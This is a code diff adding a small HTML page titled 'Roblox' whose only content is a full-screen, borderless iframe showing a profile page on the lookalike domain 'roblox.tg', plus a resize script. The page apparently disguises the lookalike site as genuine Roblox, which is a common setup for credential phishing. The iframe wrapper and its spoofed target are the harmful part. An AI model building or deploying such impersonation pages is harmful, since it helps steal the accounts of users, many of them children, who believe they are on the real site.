@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox</title>
+</head>
+<body style="margin:0; padding:0; overflow:hidden; height:100vh; width:100vw;">
+    <iframe id="embedFrame" 
+        src="https://roblox.tg/users/3994682368/profile" 
+        style="border:none; position:fixed; top:0; left:0; width:100%; height:100%; overflow:hidden;">
+    </iframe>
+
+    <script>
+        // Automatically adjust iframe size if window is resized
+        window.addEventListener("resize", function() {
+            const frame = document.getElementById("embedFrame");
+            frame.style.width = window.innerWidth + "px";
+            frame.style.height = window.innerHeight + "px";
+        });
+    </script>
+</body>
+</html>
